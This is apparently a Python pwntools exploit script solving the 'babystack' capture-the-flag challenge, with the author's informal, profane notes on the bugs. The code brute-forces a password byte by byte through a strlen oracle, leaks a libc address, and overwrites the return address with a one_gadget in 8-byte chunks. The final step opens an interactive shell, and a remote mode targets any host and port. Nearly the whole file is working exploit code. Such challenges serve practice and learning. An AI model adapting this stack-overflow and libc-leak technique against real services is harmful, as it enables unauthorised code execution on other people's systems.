#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babystack_patched')
libc = exe.libc
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
- strlen stops at null byte, using the authentication function as an oracle we can leak memory address
- the memory buffer isn't initialized in the copy_to_buf function, and strcpy keeps copying until it finds a null byte
- we can use this to overwrite the return address of the function to point to main again and this happens because it uses the stack buffer in the auth func

- canary check is done by comparing the generated random mem with the value stored in pass[16]

shit!! strcpy...

need to write it in chunks of 8 bytes first 

i kinda feel i've overcomplicated this one! (fr!!)

need to write a function to null terminate the upper bytes 

wtffffffffff where's the error in my logic huh ( found it... fucking null byte)

there's not enough space on the stack to write full ropchain to leak libc, hence i need to actually leak libc and do system(/bin/sh) in one go or one gadget..

ok i'm def overcomplicating... there's no need to leak pie :)

use uninialized mem and move it to buf[16] then leak libc from it

im too weak lmao, easy challenge took me so much time ;)

gotta improve more!

btw i used the one gadget where constraint is rax == null because when the program wants to exit it sets rax to 0

sooo slow on remote :(

im gonna stop the video, xD (laptop is about to get off)
"""



def init():
    global io

    io = start()

def authenticate(data, leak=False):
    if leak:
        io.sendafter(b">>", b"1")
        io.sendafter(b":", data)
        leak = io.recvline()
    else:
        io.sendafter(b">>", b"1" + b"A"*0xf )
        io.sendafter(b":", data)
        leak = io.recvline()
    return leak

def reset():
    io.sendlineafter(b">>", b"1")

def do_copy(data):
    io.sendafter(b">>", b"3")
    io.sendafter(b":", data)

def null_terminate(pos):
    padding = b"A" * 0x28
    for i in range(7, -1, -1):
        payload = padding + b"A" * pos + b"B" * i + b"\x00"
        authenticate(b"\x00" + cyclic(63) + payload)
        do_copy(b"A" * 63)
        reset()


def solve():

    password = b""

    while len(password) < 16:
        for c in range(1, 0x100):
            oracle = authenticate(password + bytes([c]) + b"\x00")
            if b"Failed !" not in oracle:
                password += bytes([c])
                reset()
                break

    info("Leaked password: %s", password)

    authenticate(b"\x00" + cyclic(63 + 0x18))
    do_copy(b"A" * 63)
    reset()

    setvuf = b""
    pad = b"aqaaaraaasaaataa1\naaavaa"

    while len(setvuf) < 6:
        for c in range(1, 0x100):
            oracle = authenticate(pad + bytes([c]) + b"\x00", leak=True)
            if b"Failed !" not in oracle:
                setvuf += bytes([c])
                pad += bytes([c])
                reset()
                break

    libc.address = u64(setvuf.ljust(8, b"\x00")) - 0x6ffb4
    info("Libc base address: %#x", libc.address)

    og = libc.address + 0x45216

    ropchain = flat(
        [
            og
        ]
    )

    for i in range(len(ropchain)//8, -1, -1):
        chunk = ropchain[i*8:(i+1)*8]

        payload = flat(
            [
                password,
                b"A" * 0x18,
                b"B" * (len(chunk) * i),
                chunk
            ]
        )

        null_terminate(i * 8)
        authenticate(b"\x00" + cyclic(63) + payload)
        do_copy(b"A" * 63)
        reset()

    authenticate(b"\x00")
    io.sendlineafter(b">>", b"2")

    io.interactive() 


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

